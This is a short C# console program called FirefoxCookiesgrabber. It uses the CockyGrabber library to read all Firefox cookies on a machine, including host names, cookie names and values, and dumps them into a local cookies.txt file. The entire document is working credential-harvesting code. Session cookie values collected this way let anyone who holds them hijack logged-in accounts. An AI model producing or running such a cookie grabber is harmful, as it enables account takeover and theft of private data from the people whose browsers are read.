using CockyGrabber;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FirefoxCookiesgrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            StringBuilder cookiesfirefox = new StringBuilder();

            FirefoxGrabber fg = new FirefoxGrabber();
            if (fg.CookiesExists())
            {
                foreach (var item in fg.GetAllCookies())
                {
                    cookiesfirefox.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }

            }

            File.WriteAllText("cookies.txt", cookiesfirefox.ToString());
            Console.Write("Done !");
            Console.ReadKey();
        }
    }
}
